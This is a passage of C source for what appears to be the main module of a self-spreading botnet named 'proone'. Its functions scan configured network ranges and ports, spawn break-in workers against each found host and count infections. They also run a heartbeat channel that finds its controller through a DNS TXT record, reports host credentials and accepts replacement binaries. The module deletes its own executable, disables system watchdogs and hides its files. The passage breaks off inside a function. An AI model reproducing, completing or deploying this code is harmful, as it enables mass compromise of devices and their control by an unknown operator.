#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/wait.h>
#include <elf.h>

#include <mbedtls/sha256.h>
#include <mbedtls/base64.h>
#include <libssh2.h>

#include "config.h"
#include "proone_conf/config.h"
#include "proone.h"
#include "protocol.h"
#include "util_rt.h"
#include "endian.h"
#include "dvault.h"
#include "llist.h"
#include "mbedtls.h"
#include "htbt.h"
#include "recon.h"
#include "bne.h"
#include "inet.h"


struct prne_global prne_g;
struct prne_shared_global *prne_s_g = NULL;

static prne_worker_t wkr_arr[3];
static size_t wkr_cnt;
static prne_llist_t bne_list;
static prne_bne_param_t bne_param;

static void alloc_resolv (void) {
	prne_resolv_ns_pool_t pool4, pool6;
	size_t i, len, cnt;
	const uint8_t *bin;

	prne_resolv_init_ns_pool(&pool4);
	prne_resolv_init_ns_pool(&pool6);

	bin = prne_dvault_get_bin(PRNE_DATA_KEY_RESOLV_NS_IPV4, &len);
	prne_dbgast(len != 0 && len % 16 == 0);
	cnt = len / 16;

	if (!prne_resolv_alloc_ns_pool(&pool4, cnt)) {
		goto END;
	}
	for (i = 0; i < cnt; i += 1) {
		memcpy(pool4.arr[i].addr.addr, bin + i * 16, 16);
		pool4.arr[i].addr.ver = PRNE_IPV_4;
		pool4.arr[i].port = 853;
	}

	bin = prne_dvault_get_bin(PRNE_DATA_KEY_RESOLV_NS_IPV6, &len);
	prne_dbgast(len != 0 && len % 16 == 0);
	cnt = len / 16;

	if (!prne_resolv_alloc_ns_pool(&pool6, cnt)) {
		goto END;
	}
	for (i = 0; i < cnt; i += 1) {
		memcpy(pool6.arr[i].addr.addr, bin + i * 16, 16);
		pool6.arr[i].addr.ver = PRNE_IPV_6;
		pool6.arr[i].port = 853;
	}

	prne_g.resolv = prne_alloc_resolv(
		wkr_arr + wkr_cnt,
		&prne_g.ssl.rnd,
		pool4,
		pool6);
	if (prne_g.resolv != NULL) {
		wkr_arr[wkr_cnt].attr = pth_attr_new();
		pth_attr_set(wkr_arr[wkr_cnt].attr, PTH_ATTR_PRIO, PTH_PRIO_STD + 1);

		wkr_cnt += 1;
		pool4.ownership = false;
		pool6.ownership = false;
		prne_bf_set(prne_g.flags, PRNE_IFLAG_WKR_RESOLV, true);
	}
	else if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
		prne_dbgperr("** prne_alloc_resolv()");
	}

END:
	prne_dvault_reset();
	prne_resolv_free_ns_pool(&pool4);
	prne_resolv_free_ns_pool(&pool6);
}

static bool cb_htbt_cnc_txtrec (void *ctx, char *out) {
	strcpy(out, prne_dvault_get_cstr(PRNE_DATA_KEY_CNC_TXT_REC, NULL));
	prne_dvault_reset();
	return true;
}

static bool cb_htbt_hostinfo (void *ctx, prne_htbt_host_info_t *out) {
	const struct timespec ts_now = prne_gettime(CLOCK_MONOTONIC);

	out->parent_uptime = prne_sub_timespec(ts_now, prne_g.parent_start).tv_sec;
	out->child_uptime = prne_sub_timespec(ts_now, prne_g.child_start).tv_sec;
	if (prne_s_g != NULL) {
		memcpy(out->org_id, prne_s_g->org_id, 16);
		out->bne_cnt = prne_s_g->bne_cnt;
		out->infect_cnt = prne_s_g->infect_cnt;
		if (prne_htbt_alloc_host_info(
				out,
				prne_s_g->host_cred_len,
				sizeof(prne_g.flags)))
		{
			memcpy(
				out->host_cred,
				prne_s_g->host_cred_data,
				prne_s_g->host_cred_len);
			memcpy(out->bf, prne_g.flags, sizeof(prne_g.flags));
		}
		out->crash_cnt = prne_s_g->crash_cnt;
	}
	out->parent_pid = prne_g.parent_pid;
	out->child_pid = prne_g.child_pid;
	memcpy(
		out->prog_ver,
		prne_dvault_get_bin(PRNE_DATA_KEY_PROG_VER, NULL),
		prne_op_min(sizeof(out->prog_ver), 16));
	prne_dvault_reset();
	memcpy(
		out->boot_id,
		prne_g.boot_id,
		prne_op_min(sizeof(out->boot_id), sizeof(prne_g.boot_id)));
	memcpy(
		out->instance_id,
		prne_g.instance_id,
		prne_op_min(sizeof(out->instance_id), sizeof(prne_g.instance_id)));
	out->arch = PRNE_HOST_ARCH;
	out->os = PRNE_HOST_OS;

	return true;
}

static int cb_tmpfile (
	void *ctx,
	const int flags,
	const mode_t mode,
	size_t req_size,
	char **opath)
{
	uint8_t m[16];
	char *path = prne_alloc_str(36 + 3);
	int fd = -1;
	bool ret = false;

	path[0] = 0;
	do {
		if (path == NULL) {
			break;
		}
		if (mbedtls_ctr_drbg_random(&prne_g.ssl.rnd, m, sizeof(m)) != 0) {
			break;
		}
		path[0] = '.';
		path[1] = '/';
		path[2] = '.';
		prne_uuid_tostr(m, path + 3);
		path[39] = 0;

		fd = open(path, flags, mode);
		if (fd < 0) {
			break;
		}
		if (ftruncate(fd, req_size) != 0) {
			break;
		}

		ret = true;
	} while (false);

	if (ret) {
		if (opath != NULL) {
			*opath = path;
			path = NULL;
		}
	}
	else {
		if (fd >= 0) {
			unlink(path);
		}
		prne_close(fd);
		fd = -1;
	}
	prne_free(path);
	return fd;
}

static bool cb_upbin (
	void *ctx,
	const char *path,
	const prne_htbt_cmd_t *cmd)
{
	const size_t strsize = prne_nstrlen(path) + 1;

	if (prne_s_g == NULL ||
		strsize > sizeof(prne_s_g->upbin_path) ||
		cmd->mem_len > sizeof(prne_s_g->upbin_args))
	{
		errno = ENOMEM;
		return false;
	}
	memcpy(prne_s_g->upbin_path, path, strsize);
	prne_memzero(prne_s_g->upbin_args, sizeof(prne_s_g->upbin_args));
	memcpy(prne_s_g->upbin_args, cmd->mem, cmd->mem_len);

	pth_raise(prne_g.main_pth, SIGTERM);

	return true;
}

static bool cb_fork (void *ctx) {
	sigset_t ss;

	sigfillset(&ss);
	pth_sigmask(SIG_UNBLOCK, &ss, NULL);

	libssh2_exit();

	return true;
}


static void alloc_htbt (void) {
	prne_htbt_t *htbt;
	prne_htbt_param_t param;

	prne_htbt_init_param(&param);

	if (!(prne_g.c_ssl.ready && prne_g.s_ssl.ready)) {
		goto END;
	}

	param.lbd_ssl_conf = &prne_g.s_ssl.conf;
	param.main_ssl_conf = &prne_g.c_ssl.conf;
	param.ctr_drbg = &prne_g.ssl.rnd;
	param.resolv = prne_g.resolv;
	param.cb_f.cnc_txtrec = cb_htbt_cnc_txtrec;
	param.cb_f.hostinfo = cb_htbt_hostinfo;
	param.cb_f.tmpfile = cb_tmpfile;
	param.cb_f.upbin = cb_upbin;
	param.cb_f.fork = cb_fork;
	param.rcb = &prne_g.rcb_param;
	param.blackhole = prne_g.blackhole[1];

	htbt = prne_alloc_htbt(
		wkr_arr + wkr_cnt,
		&param);
	if (htbt != NULL) {
		wkr_arr[wkr_cnt].attr = pth_attr_new();
		pth_attr_set(wkr_arr[wkr_cnt].attr, PTH_ATTR_PRIO, PTH_PRIO_STD + 1);

		wkr_cnt += 1;
		prne_bf_set(prne_g.flags, PRNE_IFLAG_WKR_HTBT, true);
	}
	else if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
		prne_dbgperr("** prne_alloc_htbt()");
	}

END:
	prne_htbt_free_param(&param);
}

static void cb_recon_evt (void *ctx, const prne_net_endpoint_t *ep) {
	prne_llist_entry_t *e = NULL;
	prne_worker_t *w = NULL;
	prne_bne_t *bne;

	if (bne_list.size >= PROONE_BNE_MAX_CNT) {
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_WARN) {
			prne_dbgperr("* PROONE_BNE_MAX_CNT reached!\n");
		}
		return;
	}

	for (e = bne_list.head; e != NULL; e = e->next) {
		w = (prne_worker_t*)e->element;
		bne = (prne_bne_t*)w->ctx;

		if (prne_eq_ipaddr(&ep->addr, prne_bne_get_subject(bne))) {
			return;
		}
	}

// TRY
	w = prne_malloc(sizeof(prne_worker_t), 1);
	if (w == NULL) {
		goto END;
	}
	prne_init_worker(w);

	e = prne_llist_append(&bne_list, (prne_llist_element_t)w);
	if (e == NULL) {
		goto END;
	}

	bne_param.subject = ep->addr;
	bne = prne_alloc_bne(w, &prne_g.ssl.rnd, &bne_param);
	if (bne == NULL) {
		goto END;
	}
	w->attr = pth_attr_new();
	pth_attr_set(w->attr, PTH_ATTR_PRIO, PTH_PRIO_STD - 1);

	w->pth = pth_spawn(w->attr, w->entry, w->ctx);
	if (w->pth == NULL) {
		goto END;
	}

	pth_raise(prne_g.main_pth, SIGINT);
	e = NULL;
	w = NULL;

END: // CATCH
	if (e != NULL) {
		prne_llist_erase(&bne_list, e);
	}
	if (w != NULL) {
		prne_free_worker(w);
		prne_free(w);
	}
}

static void alloc_recon (void) {
	prne_recon_t *rcn;
	prne_recon_param_t param;
	size_t dvl, cnt;
	const uint8_t *m;
	size_t i;

	prne_init_recon_param(&param);

// TRY
	param.evt_cb = cb_recon_evt;

	// load ports
	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_PORTS, &dvl);
	cnt = dvl / 2;
	if (!prne_alloc_recon_param(
		&param,
		param.blist.cnt,
		param.target.cnt,
		cnt))
	{
		goto END;
	}
	for (i = 0; i < cnt; i += 1) {
		param.ports.arr[i] = prne_recmb_msb16(m[0], m[1]);
		m += 2;
	}

	// load ipv4 targets
	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_T_IPV4, &dvl);
	cnt = dvl / 5;
	if (!prne_alloc_recon_param(
		&param,
		param.blist.cnt,
		cnt,
		param.ports.cnt))
	{
		goto END;
	}
	for (i = 0; i < cnt; i += 1) {
		prne_memzero(param.target.arr + i, sizeof(prne_recon_network_t));

		param.target.arr[i].addr.ver = PRNE_IPV_4;
		memcpy(param.target.arr[i].addr.addr, m, 4);
		prne_netmask_from_cidr(param.target.arr[i].mask, m[4]);
		m += 5;
	}
	/* reuse i */
	// load ipv6 targets
	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_T_IPV6, &dvl);
	cnt = dvl / 17;
	if (!prne_alloc_recon_param(
		&param,
		param.blist.cnt,
		param.target.cnt + cnt,
		param.ports.cnt))
	{
		goto END;
	}
	for (; i < param.target.cnt; i += 1) {
		prne_memzero(param.target.arr + i, sizeof(prne_recon_network_t));

		param.target.arr[i].addr.ver = PRNE_IPV_6;
		memcpy(param.target.arr[i].addr.addr, m, 16);
		prne_netmask_from_cidr(param.target.arr[i].mask, m[16]);
		m += 17;
	}

	// load ipv4 blacklists
	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_BL_IPV4, &dvl);
	cnt = dvl / 5;
	if (!prne_alloc_recon_param(
		&param,
		cnt,
		param.target.cnt,
		param.ports.cnt))
	{
		goto END;
	}
	for (i = 0; i < cnt; i += 1) {
		prne_memzero(param.blist.arr + i, sizeof(prne_recon_network_t));

		param.blist.arr[i].addr.ver = PRNE_IPV_4;
		memcpy(param.blist.arr[i].addr.addr, m, 4);
		prne_netmask_from_cidr(param.blist.arr[i].mask, m[4]);
		m += 5;
	}
	/* reuse i */
	// load ipv6 blacklists
	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_BL_IPV6, &dvl);
	cnt = dvl / 17;
	if (!prne_alloc_recon_param(
		&param,
		param.blist.cnt + cnt,
		param.target.cnt,
		param.ports.cnt))
	{
		goto END;
	}
	for (; i < param.blist.cnt; i += 1) {
		prne_memzero(param.blist.arr + i, sizeof(prne_recon_network_t));

		param.blist.arr[i].addr.ver = PRNE_IPV_6;
		memcpy(param.blist.arr[i].addr.addr, m, 16);
		prne_netmask_from_cidr(param.blist.arr[i].mask, m[16]);
		m += 17;
	}

	rcn = prne_alloc_recon(wkr_arr + wkr_cnt, &prne_g.ssl.rnd, &param);
	if (rcn != NULL) {
		param.ownership = false;
		wkr_cnt += 1;
		prne_bf_set(prne_g.flags, PRNE_IFLAG_WKR_RCN, true);
	}
	else if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
		prne_dbgperr("** prne_alloc_recon()");
	}

END: // CATCH
	prne_dvault_reset();
	prne_free_recon_param(&param);
}

static void alloc_workers (void) {
	for (size_t i = 0; i < sizeof(wkr_arr)/sizeof(prne_worker_t); i += 1) {
		prne_init_worker(wkr_arr + i);
	}

	if (prne_g.has_ba) {
		alloc_recon();
	}
	else {
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_WARN) {
			prne_dbgpf("* No bin archive. Not running recon worker.\n");
		}
	}
	alloc_resolv();
	alloc_htbt();
}

static void free_workers (void) {
	for (size_t i = 0; i < wkr_cnt; i += 1) {
		prne_free_worker(wkr_arr + i);
	}
	prne_g.resolv = NULL;
}

static void seed_ssl_rnd (const bool use_bent) {
	static const uint8_t BENTPY[] = PRNE_BUILD_ENTROPY;
	static const size_t BENTPY_SIZE = sizeof(BENTPY);
	int mret;

	if (use_bent) {
		mret = mbedtls_ctr_drbg_seed(
			&prne_g.ssl.rnd,
			mbedtls_entropy_func,
			&prne_g.ssl.entpy,
			BENTPY,
			BENTPY_SIZE);
	}
	else {
		mret = -1;
	}

	if (mret != 0) {
		mbedtls_ctr_drbg_seed(
			&prne_g.ssl.rnd,
			mbedtls_entropy_func,
			&prne_g.ssl.entpy,
			NULL,
			0);
	}
}

static pth_event_t build_bne_ev (void) {
	pth_event_t ret = NULL, ev;
	prne_worker_t *w;

	for (prne_llist_entry_t *e = bne_list.head; e != NULL; e = e->next) {
		w = (prne_worker_t*)e->element;
		ev = pth_event(PTH_EVENT_TID | PTH_UNTIL_TID_DEAD, w->pth);
		prne_assert(ev != NULL);

		if (ret == NULL) {
			ret = ev;
		}
		else {
			pth_event_concat(ret, ev, NULL);
		}
	}

	return ret;
}

static void proc_bne_result (const prne_bne_result_t *r) {
	if (prne_s_g != NULL) {
		prne_s_g->bne_cnt += 1;
		if (r->ny_instance) {
			prne_s_g->infect_cnt += 1;
		}
	}
}

static void reap_bne (void) {
	pth_state_t st;
	prne_worker_t *w;
	pth_attr_t a;
	const prne_bne_result_t *r;

	for (prne_llist_entry_t *e = bne_list.head; e != NULL;) {
		w = (prne_worker_t*)e->element;
		a = pth_attr_of(w->pth);
		prne_assert(pth_attr_get(a, PTH_ATTR_STATE, &st));
		pth_attr_destroy(a);

		if (st == PTH_STATE_DEAD) {
			r = NULL;
			pth_join(w->pth, (void**)&r);
			w->pth = NULL;

			proc_bne_result(r);

			prne_free_worker(w);
			prne_free(w);
			e = prne_llist_erase(&bne_list, e);
		}
		else {
			e = e->next;
		}
	}
}

/* proone_main()
* Actual main where all dangerous stuff happens.
* Most of long-lived variables are declared static so there's little stack
* allocation involved since stack allocation can cause page fault.
*/
static int proone_main (void) {
	static int caught_sig;
	static pth_event_t root_ev = NULL;
	static sigset_t ss;

	prne_assert(pth_init());
	prne_assert(libssh2_init(0) == 0);
	prne_g.main_pth = pth_self();
	{
		// set priority of main pth to max
		pth_attr_t attr = pth_attr_of(prne_g.main_pth);
		pth_attr_set(attr, PTH_ATTR_PRIO, PTH_PRIO_MAX);
		pth_attr_destroy(attr);
	}
	seed_ssl_rnd(true);

	sigemptyset(&ss);
	sigaddset(&ss, SIGTERM);
	sigaddset(&ss, SIGINT);
	pth_sigmask(SIG_BLOCK, &ss, NULL);

	alloc_workers();
	for (size_t i = 0; i < wkr_cnt; i += 1) {
		wkr_arr[i].pth = pth_spawn(
			wkr_arr[i].attr,
			wkr_arr[i].entry,
			wkr_arr[i].ctx);
		prne_assert(wkr_arr[i].pth != NULL);
	}

	while (true) {
		pth_event_free(root_ev, TRUE);
		root_ev = build_bne_ev();

		caught_sig = -1;
		pth_sigwait_ev(&ss, &caught_sig, root_ev);
		if (caught_sig == SIGTERM) {
			break;
		}

		reap_bne();
	}
	pth_sigmask(SIG_UNBLOCK, &ss, NULL);

	// reap generic workers
	for (size_t i = 0; i < wkr_cnt; i += 1) {
		prne_fin_worker(wkr_arr + i);
	}
	for (size_t i = 0; i < wkr_cnt; i += 1) {
		prne_assert(pth_join(wkr_arr[i].pth, NULL));
		wkr_arr[i].pth = NULL;
	}
	free_workers();

	// reap bne workers
	for (prne_llist_entry_t *e = bne_list.head; e != NULL; e = e->next) {
		prne_worker_t *w = (prne_worker_t*)e->element;
		prne_bne_result_t *r = NULL;

		pth_join(w->pth, (void**)&r);
		w->pth = NULL;
		proc_bne_result(r);

		prne_free_worker(w);
		prne_free(w);
	}
	prne_llist_clear(&bne_list);

	pth_event_free(root_ev, TRUE);
	pth_kill();
	libssh2_exit();

	return PRNE_PROONE_EC_OK;
}

static void close_blackhole (void) {
	prne_close(prne_g.blackhole[0]);
	prne_close(prne_g.blackhole[1]);
	prne_g.blackhole[0] = -1;
	prne_g.blackhole[1] = -1;
}

static void open_blackhole (void) {
	close_blackhole();

	do {
		// try null device
		prne_g.blackhole[1] = open("/dev/null", O_WRONLY);
		if (prne_g.blackhole[1] >= 0) {
			fcntl(prne_g.blackhole[1], F_SETFD, FD_CLOEXEC);
			break;
		}

		// try pipe
		if (pipe(prne_g.blackhole) == 0) {
			prne_sck_fcntl(prne_g.blackhole[0]);
			prne_sck_fcntl(prne_g.blackhole[1]);
			break;
		}
	} while (false);
}

static void delete_myself (const char *arg0) {
#if !PRNE_DEBUG
	unlink(arg0);
#endif
}

static void disasble_watchdog (void) {
#if !PRNE_DEBUG
	static const char *watchdog_paths[] = {
		"/dev/watchdog",
		"/dev/misc/watchdog"
	};
	static const int one = 1;
	int fd;
	size_t i;

	for (i = 0; i < sizeof(watchdog_paths) / sizeof(const char*); i += 1) {
		if ((fd = open(watchdog_paths[i], O_RDWR)) >= 0) {
			ioctl(fd, 0x80045704, &one);
			prne_close(fd);
			break;
		}
	}
#endif
}

static void set_env (void) {
	// environment set up function calls in here
}

static void setup_dvault (void) {
	prne_g.m_dvault = (uint8_t*)prne_malloc(1, prne_g.rcb_param.dv_len);
	memcpy(prne_g.m_dvault, prne_g.rcb_param.m_dv, prne_g.rcb_param.dv_len);

	prne_init_dvault(prne_g.m_dvault);
}

static void init_proone (const char *self) {
	int fd;
#if PRNE_HOST_WORDSIZE == 64
	static const unsigned char EXPTD_CLASS = 2;
#define ELF_EHDR_TYPE Elf64_Ehdr
#elif PRNE_HOST_WORDSIZE == 32
	static const unsigned char EXPTD_CLASS = 1;
#define ELF_EHDR_TYPE Elf32_Ehdr
#else
	#error "FIXME!"
#endif
#if PRNE_HOST_ENDIAN == PRNE_ENDIAN_LITTLE
	static const unsigned char EXPTD_DATA = 1;
#elif PRNE_HOST_ENDIAN == PRNE_ENDIAN_BIG
	static const unsigned char EXPTD_DATA = 2;
#else
	#error "FIXME!"
#endif
	ELF_EHDR_TYPE *elf;
	uint_fast32_t dvault_ofs, binarch_ofs, binarch_size;
	off_t file_size;

	set_env();

	fd = open(self, O_RDONLY);
	prne_assert(fd >= 0);
	file_size = lseek(fd, 0, SEEK_END);
	prne_assert(file_size >= (off_t)sizeof(ELF_EHDR_TYPE));
	prne_g.rcb_param.m_self = (const uint8_t*)mmap(
		NULL,
		file_size,
		PROT_READ,
		MAP_SHARED,
		fd,
		0);
	prne_close(fd);
	prne_assert(prne_g.rcb_param.m_self != MAP_FAILED);

	// Use header
	elf = (ELF_EHDR_TYPE*)prne_g.rcb_param.m_self;
	prne_assert(
		elf->e_ident[EI_MAG0] == ELFMAG0 &&
		elf->e_ident[EI_MAG1] == ELFMAG1 &&
		elf->e_ident[EI_MAG2] == ELFMAG2 &&
		elf->e_ident[EI_MAG3] == ELFMAG3);
	prne_assert(elf->e_ident[EI_CLASS] == EXPTD_CLASS);
	prne_assert(elf->e_ident[EI_DATA] == EXPTD_DATA);

	prne_g.rcb_param.self_len = (size_t)file_size;
	prne_g.rcb_param.exec_len =
		elf->e_shoff +
		(elf->e_shentsize * elf->e_shnum);
	prne_g.rcb_param.exec_len = prne_salign_next(
		prne_g.rcb_param.exec_len,
		PRNE_BIN_ALIGNMENT);
	prne_massert(
		prne_g.rcb_param.exec_len + 8 <= (size_t)file_size,
		"No appendix!");

	// Read sizes
	prne_g.rcb_param.dv_len =
		(uint_fast16_t)prne_g.rcb_param.m_self[prne_g.rcb_param.exec_len + 0] << 8 |
		(uint_fast16_t)prne_g.rcb_param.m_self[prne_g.rcb_param.exec_len + 1] << 0;

	dvault_ofs = prne_g.rcb_param.exec_len + 8;
	binarch_ofs = dvault_ofs + prne_salign_next(
		prne_g.rcb_param.dv_len,
		PRNE_BIN_ALIGNMENT);
	binarch_size = file_size - binarch_ofs;

	// Load dvault
	prne_assert(dvault_ofs + prne_g.rcb_param.dv_len <= (size_t)file_size);
	prne_g.rcb_param.m_dv = prne_g.rcb_param.m_self + dvault_ofs;
	setup_dvault();

	if (binarch_size > 0) {
		prne_g.has_ba = PRNE_PACK_RC_OK == prne_index_bin_archive(
			prne_g.rcb_param.m_self + binarch_ofs,
			binarch_size,
			&prne_g.bin_archive);
	}
	if (prne_g.has_ba) {
		prne_bf_set(prne_g.flags, PRNE_IFLAG_BA, true);
	}
	else {
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_WARN) {
			prne_dbgpf("* This executable has no binary archive!\n");
		}
	}
#undef ELF_EHDR_TYPE
}

static void deinit_proone (void) {
	prne_deinit_dvault();
	prne_free(prne_g.m_dvault);
	prne_g.m_dvault = NULL;
}

static void load_ssl_conf (void) {
#define BREAKIF_ERR(f)\
	if (mret != 0) {\
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {\
			prne_dbgpf("** %s() returned %d\n", f, mret);\
		}\
		break;\
	}
	static const char *ALP_LIST[] = { PRNE_HTBT_TLS_ALP, NULL };
	size_t dvlen = 0;
	int mret;
	const uint8_t *data;

	do {
		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_CA_CRT, &dvlen);
		mret = mbedtls_x509_crt_parse(&prne_g.ssl.ca, data, dvlen);
		BREAKIF_ERR("mbedtls_x509_crt_parse");

		do {
			// Server stuff
			mret = mbedtls_ssl_config_defaults(
				&prne_g.s_ssl.conf,
				MBEDTLS_SSL_IS_SERVER,
				MBEDTLS_SSL_TRANSPORT_STREAM,
				MBEDTLS_SSL_PRESET_DEFAULT);
			BREAKIF_ERR("mbedtls_ssl_config_defaults");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_CRT, &dvlen);
			mret = mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, data, dvlen);
			BREAKIF_ERR("mbedtls_x509_crt_parse");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_KEY, &dvlen);
			mret = mbedtls_pk_parse_key(
				&prne_g.s_ssl.pk,
				data,
				dvlen,
				NULL,
				0);
			BREAKIF_ERR("mbedtls_pk_parse_key");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_DH, &dvlen);
			mret = mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, data, dvlen);
			BREAKIF_ERR("mbedtls_dhm_parse_dhm");
			mret = mbedtls_ssl_conf_own_cert(
				&prne_g.s_ssl.conf,
				&prne_g.s_ssl.crt,
				&prne_g.s_ssl.pk);
			BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
			mret = mbedtls_ssl_conf_dh_param_ctx(
				&prne_g.s_ssl.conf,
				&prne_g.s_ssl.dhm);
			BREAKIF_ERR("mbedtls_ssl_conf_dh_param_ctx");
			mret = mbedtls_ssl_conf_alpn_protocols(
				&prne_g.s_ssl.conf,
				ALP_LIST);
			BREAKIF_ERR("mbedtls_ssl_conf_alpn_protocols");
			prne_g.s_ssl.ready = true;
		} while (false);

		do {
			// Client stuff
			mret = mbedtls_ssl_config_defaults(
				&prne_g.c_ssl.conf,
				MBEDTLS_SSL_IS_CLIENT,
				MBEDTLS_SSL_TRANSPORT_STREAM,
				MBEDTLS_SSL_PRESET_DEFAULT);
			BREAKIF_ERR("mbedtls_ssl_config_defaults");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_CRT, &dvlen);
			mret = mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, data, dvlen);
			BREAKIF_ERR("mbedtls_x509_crt_parse");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_KEY, &dvlen);
			mret = mbedtls_pk_parse_key(
				&prne_g.c_ssl.pk,
				data,
				dvlen,
				NULL,
				0);
			BREAKIF_ERR("mbedtls_pk_parse_key");
			mret = mbedtls_ssl_conf_own_cert(
				&prne_g.c_ssl.conf,
				&prne_g.c_ssl.crt,
				&prne_g.c_ssl.pk);
			BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
			mret = mbedtls_ssl_conf_alpn_protocols(
				&prne_g.c_ssl.conf,
				ALP_LIST);
			BREAKIF_ERR("mbedtls_ssl_conf_alpn_protocols");
			prne_g.c_ssl.ready = true;
		} while (false);
	} while (false);
	prne_dvault_reset();

	// set mutual auth
	// ignore expired cert (system wall clock might not be set)
	if (prne_g.s_ssl.ready) {
		mbedtls_ssl_conf_rng(
			&prne_g.s_ssl.conf,
			mbedtls_ctr_drbg_random,
			&prne_g.ssl.rnd);
		mbedtls_ssl_conf_ca_chain(
			&prne_g.s_ssl.conf,
			&prne_g.ssl.ca, NULL);
		mbedtls_ssl_conf_authmode(
			&prne_g.s_ssl.conf,
			MBEDTLS_SSL_VERIFY_REQUIRED);
		mbedtls_ssl_conf_verify(
			&prne_g.s_ssl.conf,
			prne_mbedtls_x509_crt_verify_cb,
			NULL);
	}
	if (prne_g.c_ssl.ready) {
		mbedtls_ssl_conf_rng(
			&prne_g.c_ssl.conf,
			mbedtls_ctr_drbg_random,
			&prne_g.ssl.rnd);
		mbedtls_ssl_conf_ca_chain(
			&prne_g.c_ssl.conf,
			&prne_g.ssl.ca,
			NULL);
		mbedtls_ssl_conf_authmode(
			&prne_g.c_ssl.conf,
			MBEDTLS_SSL_VERIFY_REQUIRED);
		mbedtls_ssl_conf_verify(
			&prne_g.c_ssl.conf,
			prne_mbedtls_x509_crt_verify_cb,
			NULL);
		mbedtls_ssl_conf_min_version(
			&prne_g.c_ssl.conf,
			MBEDTLS_SSL_MAJOR_VERSION_3,
			MBEDTLS_SSL_MINOR_VERSION_0);
	}
#undef BREAKIF_ERR
}

static bool try_lock_file (const int fd) {
	return flock(fd, LOCK_EX | LOCK_NB) == 0;
}

static bool format_shared_global (const int fd) {
	uint8_t rev;

	if (read(fd, &rev, 1) != 1) {
		return false;
	}

	switch (rev) {
	// Future format update code goes here
	case 0:
		return
			lseek(fd, 0, SEEK_END) >= (off_t)sizeof(struct prne_shared_global);
	}

	return false;
}

static void skel_shared_global (struct prne_shared_global *skel) {
	prne_memzero(skel, sizeof(struct prne_shared_global));
	// Future code for new shared_global format goes here
	skel->rev = 0;
}

/* Hash following to get name for shared global backing file:
*	The salt value "proone"
*	Boot ID
*	Hostname
* (In this order!)
*
* Note that the shared global is meant to be persistent only for current boot.
* It will be lost after the machine restart.
*/
static void hash_shg_name (char *out) {
	mbedtls_sha256_context h;
	uint8_t m[32];
	size_t dv_len;
	const uint8_t *dv_dat;
	int fd = -1, f_ret;

	prne_memzero(m, sizeof(m));
	mbedtls_sha256_init(&h);

// TRY
	if (mbedtls_sha256_starts_ret(&h, 0) != 0) {
		goto CATCH;
	}

	dv_dat = prne_dvault_get_bin(PRNE_DATA_KEY_SHG_SALT, &dv_len);
	if (mbedtls_sha256_update_ret(&h, dv_dat, dv_len) != 0) {
		goto CATCH;
	}
	prne_dvault_reset();

	if (mbedtls_sha256_update_ret(&h, prne_g.boot_id, 16) != 0) {
		goto CATCH;
	}

	fd = open("/etc/hostname", O_RDONLY);
	if (fd >= 0) {
		uint8_t buf[256];

		f_ret = read(fd, buf, sizeof(buf));
		if (f_ret > 0) {
			if (mbedtls_sha256_update_ret(&h, buf, f_ret) != 0) {
				goto CATCH;
			}
		}
		prne_close(fd);
		fd = -1;
	}

	mbedtls_sha256_finish_ret(&h, m);

CATCH:
	prne_dvault_reset();
	mbedtls_sha256_free(&h);
	out[0] = '/';
	out[1] = '.';
	prne_uuid_tostr(m, out + 2);
	out[38] = 0;
	prne_close(fd);
}

static bool try_open_sg (const char *path, const bool shm, int *ret) {
	*ret = shm ?
		shm_open(path, O_RDWR, 0600) :
		open(path, O_RDWR, 0600);
	if (*ret >= 0) {
		if (!try_lock_file(*ret)) {
			return false;
		}
		if (format_shared_global(*ret)) {
			return true;
		}
		else {
			close(*ret);
			*ret = -1;
		}
	}

	*ret = shm ?
		shm_open(path, O_RDWR | O_CREAT | O_TRUNC, 0600) :
		open(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
	if (*ret >= 0) {
		struct prne_shared_global skel;

		skel_shared_global(&skel);

		if (!(try_lock_file(*ret) &&
			write(*ret, &skel, sizeof(skel)) == sizeof(skel)))
		{
			close(*ret);
			*ret = -1;
		}
		prne_bf_set(prne_g.flags, PRNE_IFLAG_INIT_RUN, true);
	}

	return true;
}

/* init_shared_global ()
*
* Returns true if there's no other process detected. Returns false otherwise
* to indicate that the program should not progress further.
*/
static bool init_shared_global (void) {
	int fd = -1;
	char fname[39];
	char path[38 + prne_op_max(sizeof("/tmp"), sizeof("."))];
	bool ret = true;

	/*
	* 1. Try creating shm, which is the most favourable
	* 2. Try creating a file in /tmp, which is memory backed on most systems
	* 3. Try creating a file in current wd
	*
	* ... just don't use shared memory if all of these fail
	*/
	hash_shg_name(fname);

	do {
		ret = try_open_sg(fname, true, &fd);
		if (!ret) {
			goto END;
		}
		if (fd >= 0) {
			break;
		}

		strcpy(path, "/tmp");
		strcat(path, fname);
		ret = try_open_sg(path, false, &fd);
		if (!ret) {
			goto END;
		}
		if (fd >= 0) {
			break;
		}

		strcpy(path, ".");
		strcat(path, fname);
		ret = try_open_sg(path, false, &fd);
